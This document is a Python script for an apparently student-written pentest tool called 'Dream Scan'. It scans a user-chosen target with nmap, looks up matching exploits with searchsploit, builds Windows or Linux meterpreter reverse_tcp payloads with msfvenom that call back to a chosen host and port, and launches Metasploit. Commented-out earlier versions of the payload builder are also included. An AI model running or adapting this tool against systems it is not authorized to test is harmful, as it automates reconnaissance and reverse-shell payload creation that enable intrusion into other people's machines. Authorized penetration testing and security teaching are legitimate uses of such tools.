#!/usr/bin/env python3
import os
import subprocess
import random
import time

GREEN = '\033[92m'
BLUE = '\033[34m'
YELLOW = '\033[33m'
RED = '\033[31m'
END = '\033[0m'
spinner = [f"{GREEN}|{END}", f"{YELLOW}/{END}", f"{BLUE}-{END}", f"{RED}\\{END}"]
circle = [
    f"{GREEN}O{END}oooo",
    f"o{YELLOW}O{END}ooo",
    f"o{BLUE}o{END}Ooo",
    f"ooo{RED}O{END}o",
    f"oooo{BLUE}o{END}"
]

#BANNER
dreamscan=f'''{BLUE}

▓█████▄  ██▀███  ▓█████ ▄▄▄       ███▄ ▄███▓     ██████  ▄████▄   ▄▄▄       ███▄    █
▒██▀ ██▌▓██ ▒ ██▒▓█   ▀▒████▄    ▓██▒▀█▀ ██▒   ▒██    ▒ ▒██▀ ▀█  ▒████▄     ██ ▀█   █
░██   █▌▓██ ░▄█ ▒▒███  ▒██  ▀█▄  ▓██    ▓██░   ░ ▓██▄   ▒▓█    ▄ ▒██  ▀█▄  ▓██  ▀█ ██▒
░▓█▄   ▌▒██▀▀█▄  ▒▓█  ▄░██▄▄▄▄██ ▒██    ▒██      ▒   ██▒▒▓▓▄ ▄██▒░██▄▄▄▄██ ▓██▒  ▐▌██▒
░▒████▓ ░██▓ ▒██▒░▒████▒▓█   ▓██▒▒██▒   ░██▒   ▒██████▒▒▒ ▓███▀ ░ ▓█   ▓██▒▒██░   ▓██░
 ▒▒▓  ▒ ░ ▒▓ ░▒▓░░░ ▒░ ░▒▒   ▓▒█░░ ▒░   ░  ░   ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒
 ░ ▒  ▒   ░▒ ░ ▒░ ░ ░  ░ ▒   ▒▒ ░░  ░      ░   ░ ░▒  ░ ░  ░  ▒     ▒   ▒▒ ░░ ░░   ░ ▒░
 ░ ░  ░   ░░   ░    ░    ░   ▒   ░      ░      ░  ░  ░  ░          ░   ▒      ░   ░ ░
   ░       ░        ░  ░     ░  ░       ░            ░  ░ ░            ░  ░         ░
 ░                                                      ░                            
 {END}
'''
dreamscan2= f'''{BLUE}

⣿⣿⣿⣿⣿⣿⣿⣛⣻⡻⣷⣦⣙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣫⣴⣾⣿⣿
⣿⣿⣷⣾⣾⠿⡯⣿⣿⣿⣪⢿⡿⠿⣶⣌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣹⣾⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⣿⣿⣾⣿⡔⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢟⣫⣼⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⠿⣻⢟⠟⢻⡆⠿⢿⣿⡿⢛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡰⣾⣿⢟⣛⢿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣭⣭⣽⣯⣯⠜⣻⠿⢿⠿⢟⣛⣛⣛⣩⣽⣒⡿⢿⡿⠷⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣴⣿⣿⣿⣶⣙⣛⣭⣴⣶⣌⣛⣛⣛
⣿⣿⣿⣿⣿⣿⠿⣛⣵⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢛⣐⣪⠻⣿⣿⠟⢫⠶⠶⣬⣙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣭⣥⣭⣭⣭⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡶⠈⣭⣾⣿⣿⡘⣡⣾⢆⣭⣽⣹⣟⠙⢨⢴⣒⠲⣙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠚⡀⠘⠾⢵⣙⣻⣿⡿⢃⣿⣿⣿⣿⣿⣿⢩⡶⠦⢄⢺⡇⢿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡎⢄⠀⠏⢗⣒⣛⣿⣷⣾⣿⣿⠿⢟⣻⣿⠿⠚⠄⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣤⣒⣠⣚⣞⣮⣧⣴⣶⣶⣶⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡿⢻⣻⠻⢿⣿⣿⣿⠿⠏⡴⠬⢍⡻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠣⢨⡝⢻⣿⣆⠟⠩⠚⠻⢻⢛⣞⡙⠲⠄⣶⣌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿
⣿⣿⣿⣿⢘⠪⢹⣙⣐⣒⣾⣿⣿⣿⣿⣿⣶⣶⣾⣿⣼⣶⣌⢹⡘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢫⣈⣬
⣿⣿⣿⣿⣜⢶⣘⢀⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡜⡆⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢻⣫⣼⠾⣹⣶⣿
⣿⣿⣿⣿⣿⣶⣜⡲⢜⢶⢌⣹⡻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣼⠟⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢛⡰⠶⢾⠷⠶⠪⣍⣍⣴⡶⠶⣾⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣮⣤⣔⣒⣚⣛⣟⣻⣛⣛⣭⣵⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⣓⣊⣟⡋⣼⡶⣣⣿⣿⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡡⢶⠤⠼⠭⢯⣷⣷⣿⣿⣴⣿⣿⡿⡿⠿⠿⢟⣛⡛⠿⣿⣿⣿⡿⢋
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⢛⣛⣛⡻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠉⢰⣶⢪⡭⣠⢨⣤⣤⣀⡈⢓⡜⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⡀⢴⠊⢠⣶⣦⡰⠻⠻⢿⣻⣿⢿⣿⣬⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣢⣾⢸⣿⣿⣿⣿⣿⣿⣿⣟⣟⣟⣟⠯⠴⡔⢉⠛⠿⠿⠿⢟⣛⡛⠿⢿⣿⣿⣿⣿
⠿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⡩⢠⢚⣒⣋⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⠻⠿⢿⣷⣷⣷⣿⣷⣶⡸⣶⡏⣿⣷⡮⠹⢿⣿
⣝⣣⡹⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣠⡾⣸⣷⣾⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣛⣋⠇⠜⢟⡛⡿⡿⡟⣸⣿⣶⣛⣫⣽⠰⣾⣿
⣯⣭⣛⣓⣊⢭⣛⣟⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢀⡨⢼⢨⢯⢷⢿⣮⠦⠼⣿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣾⣿⣿⣿⣿⣿⣿⢃⣾⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣶⣦⣰⣽⣛⠿⣿⣿⣿⣿⣿⣿⣧⣐⢲⠤⣴⠵⠷⢖⣒⣒⣋⣴⣾⣿⣿⣿⣶⣶⣭⣝⡛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣡⣾⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣄⡺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣬⣭⣭⣭⣭⣭⣴⣶⣿⣿⣿⣿⣿⣿⣿
⣛⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣛⣻⣩⣤⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣶⣶⣬⣽⣽⣭⣬⣽⣭⣿⣵⣷⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿

{END}

'''
dreamscan3= f'''{BLUE}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⣿⣇⣀⣀⣤⣤⣤⣴⣶⣶⣶⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⣿⣿⡿⠿⠟⠛⠛⠛⠉⣁⣤⣤⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⣿⡇⠠⣶⣶⣾⣿⣷⠆⠙⠛⠛⣛⣉⠠⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⣿⣤⣀⡀⠉⠁⢠⡤⠶⠚⠋⣁⣠⣤⣴⣶⣶⣿⡿⠿⠗⠒⠀⣀⣀⣤⡄⠀
⠀⠸⣿⣿⣿⣿⣿⣶⣤⣄⣀⠚⠻⠿⣿⡟⠛⢉⣉⣠⣤⣶⣶⣿⣿⣿⣿⣿⡇⠀
⠀⢠⣤⡈⠙⠻⢿⣿⣿⣿⣿⣿⣶⣦⣤⡀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀
⠀⠈⠉⠁⠀⠀⠀⠈⠉⠛⠿⢿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⠿⠟⠛⠋⣉⡁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠇⠸⠿⠟⠛⠉⠁⠀⠀⠀⠀⢸⣿⠇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣦⣤⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{END}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
'''

print(dreamscan)

print(f"{BLUE}ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ{END}")
print(f"{BLUE}ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ{END}")
print(f"{BLUE}ZZZZ                                                                                 ZZZZ{END}")
print(f"{BLUE}ZZZZ{END}{GREEN}                               DREAM SCAN 0.0.1                                  {END}{BLUE}ZZZZ{END}")
print(f"{BLUE}ZZZZ{END}{GREEN}                      ACTIVE RECONNAISSANCE MADE SIMPLE!                         {END}{BLUE}ZZZZ{END}")
print(f"{BLUE}ZZZZ                                                                                 ZZZZ{END}")
print(f"{BLUE}ZZZZ{END}{GREEN}   Written by: David Guzman, Jacob Guerrero, Kuan Chen, Sean Pacurucu Caminero   {END}{BLUE}ZZZZ{END}")
print(f"{BLUE}ZZZZ                                                                                 ZZZZ{END}")
print(f"{BLUE}ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ{END}")
print(f"{BLUE}ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ{END}")
print('''
''')

# Define the loading strings
loading1 = f'{RED}■▢▢▢▢▢▢▢▢▢{END} 10%\r'
loading2 = f'{YELLOW}■■■■▢▢▢▢▢▢{END} 40%\r'
loading3 = f'{BLUE}■■■■■■■■▢▢{END} 80%\r'
loading4 = f'{BLUE}■■■■■■■■■■{END} 99%\r'
loading5 = f'{GREEN}■■■■■■■■■■{END} 100%\r'

print(loading1, end='')

time.sleep(1)
print(loading2, end='')
time.sleep(1)
print(loading3, end='')
time.sleep(1)
print(loading4, end='')
time.sleep(1)
print(loading5, end='')
print()
print("Dream Scan Successfully Loaded!")
print('''
''')

def main():
 
    #Prompt the user for inputs
    target = input("Enter target IP address or range: ")
    scan_type = input("Enter scan type (ex. TCP, UDP, SYN, etc.)(Leave blank for default TCP): ")
    port_range = input("Enter port or port range (ex. 1-65535 or a single port like 22 for SSH): ")
    timing = input("Enter timing option (ex. -T4 (0-5)): ")
    output = input("Enter output filename (ex. scan_results.txt) (Leave blank to skip file creation): ")
    print("*** Initializing Nmap Scan ***")
    print('''''')
    # Run the Nmap scan with the specified options
    nmap_cmd = ["nmap", "-sV" + scan_type, "-p", port_range, timing]
    # If the user specified an output filename, add it to the command
    if output:
        nmap_cmd += ["-oN", output, target]
        result = subprocess.run(nmap_cmd, capture_output=True)
        print(result.stdout.decode("utf-8"))

    # If the user did not specify an output filename, print the results to the console
    if not output:
        nmap_cmd += [target]
        result = subprocess.run(nmap_cmd, capture_output=True)
        print(result.stdout.decode())

    # Define the keyword to search for
    keyword = input("Enter the service and version: ")
    for i in range(40):
         time.sleep(0.25)
         print(f"Loading Exploits!" + circle[i % len(circle)], end="\r")


    # Execute the searchsploit command with the given keyword
    output = subprocess.check_output(["searchsploit", "-t", keyword], universal_newlines=True)

    # Print the output to the console
    print(output)
    
    # Beta: this create_payload function does not allow the user to choose a path
    '''def create_payload():
        answer = input("Do you want to create a meterpreter payload? (y/n)")
        if answer == "y":
           output = input("Enter a name for the output file: ")
           lHost = input("Choose target IP: ")
           lPort = input("Choose target port: ")
           print("Creating payload...")
           subprocess.run(['msfvenom', '-p', 'windows/meterpreter/reverse_tcp', 'LHOST=' + lHost, 'LPORT=' + lPort, '-f', 'exe', '-o', output])
        elif answer == "n":
            print("Payload not created.")
        else:
           print("Invalid input.")
           
    create_payload()
    print("")
    '''
    '''
    # function to allow the user to create a meterpreter payload
    def create_payload():
     answer = input("Before you start Metasploit if you are not sure what type of payload you are looking for \n we would suggest Meterpreter, which is a well known payload to create a reverse shell. \n Do you want to create a meterpreter payload? (y/n)")
     if answer == "y":
        output = input("Enter a name for the output file: ")
        lHost = input("Choose Local IP: ")
        lPort = input("Choose target port: ")
        path = input("Enter the output directory path (leave blank for current directory): ")
        if path == "":
            path = os.getcwd()
        output_file = os.path.join(path, output)
        #print("Creating payload...")
        for i in range(40):
            time.sleep(0.25)
            print("Creating Payload!" + spinner[i % len(spinner)], end="\r")
        subprocess.run(['msfvenom', '-p', 'windows/meterpreter/reverse_tcp', 'LHOST=' + lHost, 'LPORT=' + lPort, '-f', 'exe', '-o', output_file])
     elif answer == "n":
          print("Payload not created.")
     else:
          print("Invalid input.")

    create_payload()
    print("")
    '''
    
    # function to allow the user to create a meterpreter payload
    def create_payload():
        answer = input("Before you start Metasploit if you are not sure what type of payload you are looking for \n we would suggest Meterpreter, which is a well known payload to create a reverse shell. \n Do you want to create a meterpreter payload? (y/n)")
        if answer == "y":
           output = input("Enter a name for the output file: ")
           lHost = input("Input local IP: ")
           lPort = input("Choose target port: ")
           output_type = input("Enter the output file type (ELF or EXE): ")
           while output_type.lower() not in ['elf', 'exe']:
               output_type = input("Invalid output file type. Enter the output file type (ELF or EXE): ")
           path = input("Enter the output directory path (leave blank for current directory): ")
           if path == "":
              path = os.getcwd()
           output_file = os.path.join(path, output)
           for i in range(40):
              time.sleep(0.25)
              print("Creating Payload!" + spinner[i % len(spinner)], end="\r")
           if output_type.lower() == 'elf':
             subprocess.run(['msfvenom', '-p', 'linux/x86/meterpreter/reverse_tcp', 'LHOST=' + lHost, 'LPORT=' + lPort, '-f', 'elf', '-o', output_file])
           else:
            subprocess.run(['msfvenom', '-p', 'windows/meterpreter/reverse_tcp', 'LHOST=' + lHost, 'LPORT=' + lPort, '-f', 'exe', '-o', output_file])
        elif answer == "n":
           print("Payload not created.")
        else:
           print("Invalid input.")
        print("")
    
    create_payload()

    def start_metasploit():
        answer = input("Do you want to start Metasploit? (y/n) ")
        if answer == "y":
            print("Loading Metasploit Please Standby...")
        if answer == "y":
            try:
                subprocess.run(['msfconsole'])
            except OSError as e:
                print(f"Error: {e}")
        elif answer == "n":
            print("Metasploit not started. \nExiting Dream Scan...")
        else:
            print("Invalid input.")

    start_metasploit()

if __name__ == "__main__":
    main()
